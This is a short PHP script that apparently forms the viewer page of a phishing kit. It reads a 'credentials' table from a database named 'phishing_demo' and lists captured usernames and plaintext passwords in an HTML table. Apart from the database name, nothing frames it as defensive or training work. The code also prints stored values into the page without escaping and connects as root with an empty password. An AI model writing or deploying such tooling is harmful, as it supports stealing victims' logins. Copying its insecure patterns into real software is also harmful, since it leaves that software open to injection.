<?php
// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "phishing_demo";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Fetch stored credentials
$sql = "SELECT id, username, password, timestamp FROM credentials";
$result = $conn->query($sql);

echo "<h2>Captured Credentials</h2>";
echo "<table border='1' cellpadding='5' cellspacing='0'>
        <tr>
            <th>ID</th>
            <th>Username</th>
            <th>Password</th>
            <th>Timestamp</th>
        </tr>";

if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "<tr>
                <td>{$row['id']}</td>
                <td>{$row['username']}</td>
                <td>{$row['password']}</td>
                <td>{$row['timestamp']}</td>
              </tr>";
    }
} else {
    echo "<tr><td colspan='4'>No data found</td></tr>";
}

echo "</table>";

$conn->close();
?>
